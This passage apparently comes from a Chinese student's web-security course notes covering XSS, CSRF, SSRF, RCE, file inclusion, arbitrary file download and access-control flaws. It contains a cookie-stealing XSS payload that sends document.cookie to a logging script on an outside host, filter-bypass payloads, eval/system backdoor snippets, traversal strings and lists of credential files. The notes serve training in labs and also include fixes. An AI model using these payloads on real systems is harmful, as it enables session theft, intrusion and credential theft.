class="line">			&lt;title&gt;</span><br><span class="line">		&lt;body&gt;</span><br><span class="line">			&lt;a&gt;</span><br><span class="line">			&lt;h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">反射型</span><br><span class="line">	发包 x=xiaodi -&gt; x.php -&gt; 回包</span><br><span class="line">存储型</span><br><span class="line">	发包 x=xiaodi -&gt; x.php -&gt; 写入数据库 -&gt; x.php -&gt; 回显</span><br><span class="line">dom			前端js处理</span><br><span class="line">	发包 x=xiaodi -&gt; 本地浏览器静态前端代码 -&gt; x.php</span><br><span class="line"></span><br><span class="line">搜索XSS平台</span><br><span class="line"></span><br><span class="line">4个方面</span><br><span class="line">	1.有漏洞</span><br><span class="line">	2.对方浏览器版本不会拦截</span><br><span class="line">	3.盗取的cookie对方登陆过，且没有过滤</span><br><span class="line">	4.对方需要触发这个漏洞</span><br></pre></td></tr></table></figure>

<h3 id="day26-XSS跨站之订单及shell箱子反杀记"><a href="#day26-XSS跨站之订单及shell箱子反杀记" class="headerlink" title="day26-XSS跨站之订单及shell箱子反杀记"></a>day26-XSS跨站之订单及shell箱子反杀记</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $cookie = $_GET[&#x27;cookie&#x27;];</span><br><span class="line">	$ip = getenv(&#x27;REMOTE_ADDR&#x27;);			//远程主机地址</span><br><span class="line">	$time = date(&#x27;Y-m-d H:i:s&#x27;);			//格式显示时间</span><br><span class="line">    $referer = getenv(&#x27;HTTP_REFERER&#x27;);		//链接来源</span><br><span class="line">    $fp = fopen(&#x27;cookie.txt&#x27;, &#x27;a&#x27;);			//打开cookie.txt,若不存在就创建它</span><br><span class="line">    fwrite($fp, &quot;	IP:&quot;.$ip.&quot;	Date and Time: &quot;.$time.&quot;	Referer:&quot;.$referer.&quot;	Cookie:&quot;.$cookie.&quot;|||&quot;);</span><br><span class="line">	fclose($fp);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">#攻击语句				此处document.cookie为空值不知为何</span><br><span class="line">&lt;script src=&#x27;http://192.168.88.1/getcookie.php?cookie=&#x27;+document.cookie&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">postman软件</span><br><span class="line">	https://www.postman.com/downloads/ </span><br><span class="line">各种后门文件</span><br><span class="line">https://github.com/tennc/webshell</span><br><span class="line">0:40碟中谍</span><br><span class="line">笔记中有beef-xss kali安装的过程</span><br><span class="line">如何判定有没有后门</span><br><span class="line">	1.是脚本，看一下有没有对莫名奇妙地址发包</span><br><span class="line">	2.抓包，对进程抓包</span><br><span class="line"></span><br><span class="line">kali自带beef-xss		不过还是要下载</span><br><span class="line">可以通过这个学习攻击手法</span><br><span class="line"></span><br><span class="line">我提交的东西管理员会查看</span><br><span class="line"></span><br><span class="line">session</span><br><span class="line">	phpinfo();里面有</span><br></pre></td></tr></table></figure>

<h3 id="day27-XSS跨站之代码及httponly绕过"><a href="#day27-XSS跨站之代码及httponly绕过" class="headerlink" title="day27-XSS跨站之代码及httponly绕过"></a>day27-XSS跨站之代码及httponly绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">	cookie中设置httponly属性，js脚本讲无法读取到cookie信息，这样能有效防止XSS攻击的攻击手法</span><br><span class="line">	php.ini中session.cookie_httponly=<span class="number">1</span></span><br><span class="line">或者代码中</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;session.cookie_httponly&quot;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="comment">//或者	session_set_cookie_param(0, NULL. NULL NULL, TRUE);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">httponly的绕过</span><br><span class="line">	进入后台方式</span><br><span class="line">    	<span class="number">1</span>.cookie</span><br><span class="line">    	<span class="number">2</span>.密码</span><br><span class="line">    <span class="number">1</span>.浏览器为保存账号密码：需要xss产生登陆地址，利用表单劫持</span><br><span class="line">    <span class="number">2</span>.浏览器保存账号密码：产生在后台的xss，存储型如留言等，浏览器读取账号密码</span><br><span class="line"></span><br><span class="line">安装xss-labs</span><br><span class="line">	git <span class="keyword">clone</span> https:<span class="comment">//github.com/do0dl3/xss-labs</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">xss-lab		靶场重写了alert()函数</span><br><span class="line">	level1</span><br><span class="line">		get请求xss</span><br><span class="line">	level2 		htmlspecialchars()函数讲特殊字符转换为html实体</span><br><span class="line">		&amp;（和号） 成为&amp;amp;</span><br><span class="line">        &quot; （双引号） 成为 &amp;quot;</span><br><span class="line">        &#x27; （单引号） 成为 &amp;apos;</span><br><span class="line">        &lt; （小于） 成为 &amp;lt;</span><br><span class="line">        &gt; （大于） 成为 &amp;gt;</span><br><span class="line">		&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;		表单闭合前面的双引号和箭头符号	</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/1666967810933.png" alt="1666967810933"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">level3		没空子钻了	不接着钻</span><br><span class="line">	&#x27;onclick=&#x27;alert(1)</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/1666969051819.png" alt="1666969051819"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">level4</span><br><span class="line">	&quot; onclick=&quot;alert(1)</span><br><span class="line">level5		on-&gt;o_n</span><br><span class="line">	1&quot;&gt;&lt;a href=&#x27;javascript:alert(1)&#x27;&gt;</span><br><span class="line">level6	没有过滤大小写</span><br><span class="line">	1&quot;&gt;&lt;a Href=&#x27;JavaScript:alert(1)&#x27;&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/1667010406401.png" alt="1667010406401"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">level7</span><br><span class="line">	1&quot;&gt;&lt;a Hhrefref=&#x27;JavaSscriptcript:alert(1)&#x27;&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/1667011335590.png" alt="1667011335590"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">level8	不好绕 unicode网格编码	&amp;#XXXXX&lt;-&gt;(例：&amp;#21621：呵)		这个叫html实体编码</span><br><span class="line">	javascript:alert(&quot;1&quot;)</span><br><span class="line">	&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</span><br><span class="line">	这个绕过不太理解按理说script会被过滤掉的</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/1667011477422.png" alt="1667011477422"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">level9		检测http://</span><br><span class="line">	&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;//http://</span><br><span class="line">level10		代码审计</span><br><span class="line">	t_sort=&quot;type=&quot;text&quot; onclick=&quot;alert(1)&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/1667034128912.png" alt="1667034128912"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">level11		审计	$_SERVER[&#x27;HTTP_REFERER&#x27;]</span><br><span class="line">	抓包加</span><br><span class="line">		Referer:&quot; type=&quot;text&quot; onclick=&quot;alert(1)&quot;</span><br><span class="line">level12		审计	$_SERVER[&#x27;HTTP_USER_AGENT&#x27;]</span><br></pre></td></tr></table></figure>

<h3 id="day28-XSS跨站之WAF绕过及安全修复"><a href="#day28-XSS跨站之WAF绕过及安全修复" class="headerlink" title="day28-XSS跨站之WAF绕过及安全修复"></a>day28-XSS跨站之WAF绕过及安全修复</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">waf防护xss-labs的第一关</span><br><span class="line">	针对&lt;o*&gt; &lt;s*&gt;				onclick		script</span><br><span class="line"></span><br><span class="line">xss fuzz网站</span><br><span class="line">	http://xssfuzzer.com/fuzzer.html</span><br><span class="line">XSStrike	xss工具</span><br><span class="line">	python xsstrike.py -u &quot;http://192.168.213.135/xss-labs/level1.</span><br><span class="line">php?name=&quot; --fuzzer</span><br><span class="line">	</span><br><span class="line">修复建议</span><br><span class="line">	1.开启httponly，输入过滤，输出过滤</span><br></pre></td></tr></table></figure>

<h3 id="day29-CSRF及SSRF漏洞案例讲解"><a href="#day29-CSRF及SSRF漏洞案例讲解" class="headerlink" title="day29-CSRF及SSRF漏洞案例讲解"></a>day29-CSRF及SSRF漏洞案例讲解</h3><p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/1667053435936.png" alt="1667053435936"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">CSRF防御方案</span><br><span class="line">	1.当用户发送重要请求时需要输入原始密码</span><br><span class="line">	2.设置随机token</span><br><span class="line">	3.检验refer来源，请求时判断链接是否为当前管理员正在使用的页面（管理员在编辑文章，黑客发来恶意的修改密码链接，因为修改密码页面管理员并没有在操作，所以攻击失败）</span><br><span class="line">	4.设置验证码</span><br><span class="line">	5.限制请求方式只能为post</span><br><span class="line">SSRF(Server-Side Request Forgery:服务器请求伪造)</span><br><span class="line">	目标	从外网无法访问的内部系统</span><br><span class="line">	原因	由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制</span><br><span class="line">	挖掘 从web功能上寻找</span><br><span class="line">			1.分享：通过URL地址分享网页内容</span><br><span class="line">			2.转码服务：通过URL地址把源地址的网页内容调优使其适合手机屏幕浏览</span><br><span class="line">			3.在线翻译：通过URL翻译对应文本的内容。提供此功能的国内公司有百度、有道等</span><br><span class="line">			4.图片加载与下载：通过URL地址或下载图片</span><br><span class="line">			5.图片、文章收藏功能</span><br><span class="line">			6.未公开的api实现以及其他调用URL的功能</span><br><span class="line">		从URL关键字中寻找</span><br><span class="line">			share wap url link src source target u target 3g display sourceURI imageURL domain</span><br><span class="line">	验证 1.基本判断（排除）</span><br><span class="line">    		burpsuite抓包</span><br><span class="line">            右键打开图片</span><br><span class="line">	绕过 1.http://A.com@10.10.10.10</span><br><span class="line">		2.ip地址转换成进制		115.239.210.26=16373751032</span><br><span class="line">		</span><br><span class="line">各个协议调用探针：http，file，dict，ftp，gopher</span><br><span class="line">	http://192.168.64.144/phpmyadmin</span><br><span class="line">	file:///d:/www.txt</span><br><span class="line">	dict://192.168.64.144:3306/info</span><br><span class="line">	ftp://192.168.64.144:21</span><br><span class="line">漏洞攻击：端口扫描，指纹识别，漏洞利用，内网探针</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/1667057783285.png" alt="1667057783285"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">找个网站上述符合的地方</span><br><span class="line">	输入http://127.0.0.1测试</span><br></pre></td></tr></table></figure>

<h3 id="day30-RCE代码及命令执行漏洞全解"><a href="#day30-RCE代码及命令执行漏洞全解" class="headerlink" title="day30-RCE代码及命令执行漏洞全解"></a>day30-RCE代码及命令执行漏洞全解</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">RCE-&gt;执行脚本代码</span><br><span class="line">命令执行-&gt;执行系统命令</span><br><span class="line"></span><br><span class="line">#代码执行		eval会把字符串当作php来执行</span><br><span class="line">&lt;?php</span><br><span class="line">$test=$_GET[&quot;cmd&quot;];</span><br><span class="line">echo gettype($test);			//string</span><br><span class="line">eval($test);</span><br><span class="line">echo gettype(eval($test));		//null</span><br><span class="line">?&gt;</span><br><span class="line">http://192.168.88.1/test03.php?cmd=phpinfo();</span><br><span class="line"></span><br><span class="line">#php中system用于执行外部程序，并且显示输出</span><br><span class="line">	ver显示版本信息</span><br><span class="line">&lt;?php</span><br><span class="line">$code = $_GET[&#x27;cmd&#x27;];</span><br><span class="line">system($code);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">#漏洞形成条件</span><br><span class="line">可控变量 漏洞函数</span><br><span class="line"></span><br><span class="line">墨者靶场</span><br><span class="line">	php代码溯源4</span><br><span class="line">		根据源码解密之后</span><br><span class="line">        &lt;?php eval(echo `$_REQUEST[a]`;;) ?&gt;</span><br><span class="line">        反引号的作用</span><br><span class="line">        此处函数虽然用到了eval(),但在linux中包起来的内容会被系统命令执行</span><br><span class="line">            $ listc=`ls *.c` </span><br><span class="line">            $ echo $listc </span><br><span class="line">            main.c prog.c lib.c </span><br><span class="line">		head more tail tac都试试</span><br><span class="line">poc 验证漏洞是否存在</span><br><span class="line">exp	利用</span><br><span class="line"></span><br><span class="line">代码执行函数</span><br><span class="line">eval()					把字符串作为php代码执行</span><br><span class="line">assert()				断言	函数表达式</span><br><span class="line">call_user_func()		把第一参数作为回调函数</span><br><span class="line">call_user_func_array()	调用回到函数，并把第一个数组参数回到函数的参数</span><br><span class="line">array_map()				为数组每个圆度应用回调函数</span><br><span class="line">命令执行函数</span><br><span class="line">system()				执行外部程序并显示输出</span><br><span class="line">exec()					执行一个外部程序</span><br><span class="line">shell_exec()			通过shell环境执行命令，并将完整的输出以自渡川的方式返回</span><br><span class="line">passthru()				执行外命令并显示原始输出</span><br><span class="line">pcntl_exec()			在当前进程空间执行执行程序</span><br><span class="line">``反引号</span><br></pre></td></tr></table></figure>

<h3 id="day31-文件操作之文件包含漏洞漏洞全解"><a href="#day31-文件操作之文件包含漏洞漏洞全解" class="headerlink" title="day31-文件操作之文件包含漏洞漏洞全解"></a>day31-文件操作之文件包含漏洞漏洞全解</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#文件包含漏洞各个脚本代码</span><br><span class="line">ASP,PHP,JSP,ASPX</span><br><span class="line">&lt;!--#include file=&quot;1.asp&quot; --&gt;</span><br><span class="line">&lt;!--#include file=&quot;top.aspx&quot; --&gt;</span><br><span class="line">&lt;c:import url=&quot;http://thief.one/1.jsp&quot;&gt;			#jsp包含远程地址</span><br><span class="line">&lt;jsp:include page=&quot;head.jsp&quot;/&gt;					#jsp包含本地文件</span><br><span class="line">&lt;%@ include file=&quot;head.jsp&quot;%&gt;					#</span><br><span class="line">&lt;?php include(&#x27;test.php&#x27;)?&gt;</span><br><span class="line"></span><br><span class="line">检测	白盒	代码审计</span><br><span class="line">	 黑盒  漏洞扫描工具</span><br><span class="line">	 	  公开漏洞</span><br><span class="line">	 	  手工看参数值及功能点</span><br><span class="line">类型	本地包含	有无限制</span><br><span class="line">	 远程包含	 有无限制</span><br><span class="line">利用	   http</span><br><span class="line">		ftp</span><br><span class="line">		file</span><br><span class="line">		各种脚本支持协议</span><br><span class="line">修复	   固定后缀</span><br><span class="line">		固定文件</span><br><span class="line">		WAF产品</span><br><span class="line"></span><br><span class="line">固定后缀绕过</span><br><span class="line">	1.%00截断		条件：magic_quote_gpc=Off php版&lt;5.3.4</span><br><span class="line">	2.长度截断		条件windows，点号长于256；linux点号长于4096</span><br><span class="line">		/./././././././....</span><br><span class="line"></span><br><span class="line">php中 allow_url_include=on表示支持远程包含</span><br><span class="line">php伪协议			*****</span><br><span class="line">	https://www.cnblogs.com/endust/p/11804767.html</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/1667118163978.png" alt="1667118163978"></p>
<p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/1667131487703.png" alt="1667131487703"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctf 爱春秋</span><br><span class="line">	https://www.ichunqiu.com/battalion</span><br></pre></td></tr></table></figure>

<h3 id="day32-文件操作之文件下载读取全解"><a href="#day32-文件操作之文件下载读取全解" class="headerlink" title="day32-文件操作之文件下载读取全解"></a>day32-文件操作之文件下载读取全解</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">1.文件被解析		文件包含漏洞</span><br><span class="line">2.显示源代码		文件读取漏洞</span><br><span class="line">3.提示文件下载	文件下载漏洞</span><br><span class="line"></span><br><span class="line">#文件下载</span><br><span class="line">产生		任意语言代码下载功能函数</span><br><span class="line">检测 白盒	代码审计</span><br><span class="line">	黑盒		漏扫工具</span><br><span class="line">			公开漏洞</span><br><span class="line">			手工看参数及功能点（资源下载）</span><br><span class="line">利用		常见文件	后台首页日志等可见文件</span><br><span class="line">   	敏感文件	数据库配置文件</span><br><span class="line">               各种接口文件</span><br><span class="line">               密钥信息文件</span><br><span class="line">修复	部署WAF产品</span><br><span class="line">	固定目录或过跨目录符号</span><br><span class="line">	目录权限设置或单独文件权限设置</span><br><span class="line"></span><br><span class="line">#文件读取</span><br><span class="line">产生		任意语言代码获取功能函数</span><br><span class="line">		检测		手工看参数值及功能点（资源获取）</span><br><span class="line">		利用</span><br><span class="line">		修复</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">pikachu</span><br><span class="line">	有下载的地方复制链接判断</span><br><span class="line">	http://192.168.88.1/pikachu/vul/unsafedownload/execdownload.php?filename=../execdownload.php</span><br><span class="line">	&amp;readpath &amp;filepath &amp;path &amp;inputfile &amp;url &amp;data &amp;readfile &amp;menu META-INF WEB-INF</span><br><span class="line">	../ ..\ .\ ./</span><br><span class="line">	%00 ? %23 %20 .</span><br><span class="line"></span><br><span class="line">javaweb例子</span><br><span class="line">	https://blog.csdn.net/Cheng_May/article/details/78600833</span><br><span class="line">[RoarCTF 2019]Easy Java1</span><br><span class="line">	javaweb get改post可以下载</span><br><span class="line">	读取javaweb配置文件</span><br><span class="line">		WEB-INF/web.xml		记录网站相关信息</span><br><span class="line">		抓包看，用火狐有bug不会改</span><br><span class="line">		先看WEB-INF/web.xml了更具/FLAG结合java开发只是获取文件路径，最后base64解码</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/1667186872660.png" alt="1667186872660"></p>
<p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/1667187240809.png" alt="1667187240809"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Windows</span><br><span class="line">C:\boot.ini //查看系统版本</span><br><span class="line">C:\Windows\System32\inetsrv\MetaBase.xml //IIS 配置文件</span><br><span class="line">C:\Windows\repair\sam //存储系统初次安装的密码</span><br><span class="line">C:\Program Files\mysql\my.ini //Mysql 配置</span><br><span class="line">C:\Program Files\mysql\data\mysql\user.MYD //Mysql root</span><br><span class="line">C:\Windows\php.ini //php 配置信息</span><br><span class="line">C:\Windows\my.ini //Mysql 配置信息</span><br><span class="line">C:\Windows\win.ini //Windows 系统的一个基本系统配置文件</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Linux</span><br><span class="line">/root/.ssh/authorized_keys</span><br><span class="line">/root/.ssh/id_rsa</span><br><span class="line">/root/.ssh/id_ras.keystore</span><br><span class="line">/root/.ssh/known_hosts //记录每个访问计算机用户的公钥</span><br><span class="line">/etc/passwd</span><br><span class="line">/etc/shadow</span><br><span class="line">/usr/local/app/php5/lib/php.ini //PHP 配置文件</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/etc/my.cnf //mysql 配置文件</span><br><span class="line">/etc/httpd/conf/httpd.conf //apache 配置文件</span><br><span class="line">/root/.bash_history //用户历史命令记录文件</span><br><span class="line">/root/.mysql_history //mysql 历史命令记录文件</span><br><span class="line">/proc/mounts //记录系统挂载设备</span><br><span class="line">/porc/config.gz //内核配置文件</span><br><span class="line">/var/lib/mlocate/mlocate.db //全文件路径</span><br><span class="line">/porc/self/cmdline //当前进程的 cmdline 参数</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CVE-2019-18371		小米路由器远程任意文件读取漏洞</span><br><span class="line">	http://192.168.31.1/api-third-party/download/extdisks../etc/shadow</span><br></pre></td></tr></table></figure>

<h3 id="day33-逻辑越权之水平垂直越权全解"><a href="#day33-逻辑越权之水平垂直越权全解" class="headerlink" title="day33-逻辑越权之水平垂直越权全解"></a>day33-逻辑越权之水平垂直越权全解</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">水平：通过更换的某个ID之类的身份标识，从而使A账号获取（修改、删除）B账号数据</span><br><span class="line">垂直：使用低权限身份账号发送高权限账号才能有的请求，获得其高权限的操作</span><br><span class="line">未授权访问：通过删除请求中的认证信息后重放该请求，一九一可以访问或者完成操作</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pikachu垂直越权</span><br><span class="line">	普通用户使用管理员的cookie登录</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#墨者靶场--身份认证失效实战</span><br><span class="line">	burp一步一步forward</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">burpsuite的anthz插件</span><br></pre></td></tr></table></figure>

<h3 id="day34-逻辑越权之登录脆弱及支付篡改"><a href="#day34-逻辑越权之登录脆弱及支付篡改" class="headerlink" title="day34-逻辑越权之登录脆弱及支付篡改"></a>day34-逻辑越权之登录脆弱及支付篡改</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#爆破字典</span><br><span class="line">	github.com/huyuanzhi2/password_brute_dictionary</span><br><span class="line">还是代码审计</span><br></pre></td></tr></table></figure>

